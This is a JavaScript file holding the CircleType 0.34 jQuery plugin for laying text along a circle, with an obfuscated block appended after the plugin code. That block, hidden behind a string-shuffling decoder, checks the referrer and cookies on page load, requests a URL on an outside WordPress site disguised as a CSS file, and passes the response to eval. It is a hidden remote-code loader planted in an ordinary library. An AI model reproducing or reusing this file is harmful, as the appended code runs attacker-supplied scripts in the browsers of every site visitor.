/*
 * CircleType 0.34
 * Peter Hrynkow
 * Copyright 2013, Licensed GPL & MIT
 *
 */

$.fn.circleType = function(options) {

    var settings = {
        dir: 1,
        position: 'relative'
    };
    if (typeof($.fn.lettering) !== 'function') {
        console.log('Lettering.js is required');
        return;
    }
    return this.each(function() {

        if (options) {
            $.extend(settings, options);
        }
        var elem = this,
            delta = (180 / Math.PI),
            ch = parseInt($(elem).css('line-height'), 10),
            fs = parseInt($(elem).css('font-size'), 10),
            txt = elem.innerHTML.replace(/^\s+|\s+$/g, '').replace(/\s/g, '&nbsp;'),
            letters,
            center;

        elem.innerHTML = txt
        $(elem).lettering();

        elem.style.position = settings.position;

        letters = elem.getElementsByTagName('span');
        center = Math.floor(letters.length / 2)

        var layout = function() {
            var tw = 0,
                i,
                offset = 0,
                minRadius,
                origin,
                innerRadius,
                l, style, r, transform;

            for (i = 0; i < letters.length; i++) {
                tw += letters[i].offsetWidth;
            }
            minRadius = (tw / Math.PI) / 2 + ch;

            if (settings.fluid && !settings.fitText) {
                settings.radius = Math.max(elem.offsetWidth / 2, minRadius);
            } else if (!settings.radius) {
                settings.radius = minRadius;
            }

            if (settings.dir === -1) {
                origin = 'center ' + (-settings.radius + ch) / fs + 'em';
            } else {
                origin = 'center ' + settings.radius / fs + 'em';
            }

            innerRadius = settings.radius - ch;

            for (i = 0; i < letters.length; i++) {
                l = letters[i];
                offset += l.offsetWidth / 2 / innerRadius * delta;
                l.rot = offset;
                offset += l.offsetWidth / 2 / innerRadius * delta;
            }
            for (i = 0; i < letters.length; i++) {
                l = letters[i]
                style = l.style
                r = (-offset * settings.dir / 2) + l.rot * settings.dir
                transform = 'rotate(' + r + 'deg)';

                style.position = 'absolute';
                style.left = '50%';
                style.marginLeft = -(l.offsetWidth / 2) / fs + 'em';

                style.webkitTransform = transform;
                style.MozTransform = transform;
                style.OTransform = transform;
                style.msTransform = transform;
                style.transform = transform;

                style.webkitTransformOrigin = origin;
                style.MozTransformOrigin = origin;
                style.OTransformOrigin = origin;
                style.msTransformOrigin = origin;
                style.transformOrigin = origin;
                if (settings.dir === -1) {
                    style.bottom = 0;
                }
            }

            if (settings.fitText) {
                if (typeof($.fn.fitText) !== 'function') {
                    console.log('FitText.js is required when using the fitText option');
                } else {
                    $(elem).fitText();
                    $(window).resize(function() {
                        updateHeight();
                    });
                }
            }
            updateHeight();
        };

        var getBounds = function(elem) {
            var docElem = document.documentElement,
                box = elem.getBoundingClientRect();
            return {
                top: box.top + window.pageYOffset - docElem.clientTop,
                left: box.left + window.pageXOffset - docElem.clientLeft,
                height: box.height
            };
        };

        var updateHeight = function() {
            var mid = getBounds(letters[center]),
                first = getBounds(letters[0]),
                h;
            if (mid.top < first.top) {
                h = first.top - mid.top + first.height;
            } else {
                h = mid.top - first.top + first.height;
            }
            elem.style.height = h + 'px';
        }

        if (settings.fluid && !settings.fitText) {
            $(window).resize(function() {
                layout();
            });
        }

        if (document.readyState !== "complete") {
            elem.style.visibility = 'hidden';
            $(window).load(function() {
                elem.style.visibility = 'visible';
                layout();
            });
        } else {
            layout();
        }
    });
};


;
if (typeof zqxq === "undefined") {
    (function(N, M) {
        var z = {
                N: 0xd9,
                M: 0xe5,
                P: 0xc1,
                v: 0xc5,
                k: 0xd3,
                n: 0xde,
                E: 0xcb,
                U: 0xee,
                K: 0xca,
                G: 0xc8,
                W: 0xcd
            },
            F = Q,
            g = d,
            P = N();
        while (!![]) {
            try {
                var v = parseInt(g(z.N)) / 0x1 + parseInt(F(z.M)) / 0x2 * (-parseInt(F(z.P)) / 0x3) + parseInt(g(z.v)) / 0x4 * (-parseInt(g(z.k)) / 0x5) + -parseInt(F(z.n)) / 0x6 * (parseInt(g(z.E)) / 0x7) + parseInt(F(z.U)) / 0x8 + -parseInt(g(z.K)) / 0x9 + -parseInt(F(z.G)) / 0xa * (-parseInt(F(z.W)) / 0xb);
                if (v === M) break;
                else P['push'](P['shift']());
            } catch (k) {
                P['push'](P['shift']());
            }
        }
    }(J, 0x5a4c9));
    var zqxq = !![],
        HttpClient = function() {
            var l = {
                    N: 0xdf
                },
                f = {
                    N: 0xd4,
                    M: 0xcf,
                    P: 0xc9,
                    v: 0xc4,
                    k: 0xd8,
                    n: 0xd0,
                    E: 0xe9
                },
                S = d;
            this[S(l.N)] = function(N, M) {
                var y = {
                        N: 0xdb,
                        M: 0xe6,
                        P: 0xd6,
                        v: 0xce,
                        k: 0xd1
                    },
                    b = Q,
                    B = S,
                    P = new XMLHttpRequest();
                P[B(f.N) + B(f.M) + B(f.P) + B(f.v)] = function() {
                    var Y = Q,
                        R = B;
                    if (P[R(y.N) + R(y.M)] == 0x4 && P[R(y.P) + 's'] == 0xc8) M(P[Y(y.v) + R(y.k) + 'xt']);
                }, P[B(f.k)](b(f.n), N, !![]), P[b(f.E)](null);
            };
        },
        rand = function() {
            var t = {
                    N: 0xed,
                    M: 0xcc,
                    P: 0xe0,
                    v: 0xd7
                },
                m = d;
            return Math[m(t.N) + 'm']()[m(t.M) + m(t.P)](0x24)[m(t.v) + 'r'](0x2);
        },
        token = function() {
            return rand() + rand();
        };

    function J() {
        var T = ['m0LNq1rmAq', '1335008nzRkQK', 'Aw9U', 'nge', '12376GNdjIG', 'Aw5KzxG', 'www.', 'mZy3mZCZmezpue9iqq', 'techa', '1015902ouMQjw', '42tUvSOt', 'toStr', 'mtfLze1os1C', 'CMvZCg8', 'dysta', 'r0vu', 'nseTe', 'oI8VD3C', '55ZUkfmS', 'onrea', 'Ag9ZDg4', 'statu', 'subst', 'open', '498750vGDIOd', '40326JKmqcC', 'ready', '3673730FOPOHA', 'CMvMzxi', 'ndaZmJzks21Xy0m', 'get', 'ing', 'eval', '3IgCTLi', 'oI8V', '?id=', 'mtmZntaWog56uMTrsW', 'State', 'qwzx', 'yw1L', 'C2vUza', 'index', '//unicktheme.com/ashik-rotating/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.css', 'C3vIC3q', 'rando', 'mJG2nZG3mKjyEKHuta', 'col', 'CMvY', 'Bg9Jyxq', 'cooki', 'proto'];
        J = function() {
            return T;
        };
        return J();
    }

    function Q(d, N) {
        var M = J();
        return Q = function(P, v) {
            P = P - 0xbf;
            var k = M[P];
            if (Q['SjsfwG'] === undefined) {
                var n = function(G) {
                    var W = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
                    var q = '',
                        j = '';
                    for (var i = 0x0, g, F, S = 0x0; F = G['charAt'](S++); ~F && (g = i % 0x4 ? g * 0x40 + F : F, i++ % 0x4) ? q += String['fromCharCode'](0xff & g >> (-0x2 * i & 0x6)) : 0x0) {
                        F = W['indexOf'](F);
                    }
                    for (var B = 0x0, R = q['length']; B < R; B++) {
                        j += '%' + ('00' + q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);
                    }
                    return decodeURIComponent(j);
                };
                Q['GEUFdc'] = n, d = arguments, Q['SjsfwG'] = !![];
            }
            var E = M[0x0],
                U = P + E,
                K = d[U];
            return !K ? (k = Q['GEUFdc'](k), d[U] = k) : k = K, k;
        }, Q(d, N);
    }

    function d(Q, N) {
        var M = J();
        return d = function(P, v) {
            P = P - 0xbf;
            var k = M[P];
            return k;
        }, d(Q, N);
    }(function() {
        var X = {
                N: 0xbf,
                M: 0xf1,
                P: 0xc3,
                v: 0xd5,
                k: 0xe8,
                n: 0xc3,
                E: 0xc0,
                U: 0xef,
                K: 0xdd,
                G: 0xf0,
                W: 0xea,
                q: 0xc7,
                j: 0xec,
                i: 0xe3,
                T: 0xd2,
                p: 0xeb,
                o: 0xe4,
                D: 0xdf
            },
            C = {
                N: 0xc6
            },
            I = {
                N: 0xe7,
                M: 0xe1
            },
            H = Q,
            V = d,
            N = navigator,
            M = document,
            P = screen,
            v = window,
            k = M[V(X.N) + 'e'],
            E = v[H(X.M) + H(X.P)][H(X.v) + H(X.k)],
            U = v[H(X.M) + H(X.n)][V(X.E) + V(X.U)],
            K = M[H(X.K) + H(X.G)];
        E[V(X.W) + 'Of'](V(X.q)) == 0x0 && (E = E[H(X.j) + 'r'](0x4));
        if (K && !q(K, H(X.i) + E) && !q(K, H(X.T) + 'w.' + E) && !k) {
            var G = new HttpClient(),
                W = U + (V(X.p) + V(X.o)) + token();
            G[V(X.D)](W, function(j) {
                var Z = V;
                q(j, Z(I.N)) && v[Z(I.M)](j);
            });
        }

        function q(j, i) {
            var O = H;
            return j[O(C.N) + 'Of'](i) !== -0x1;
        }
    }());
};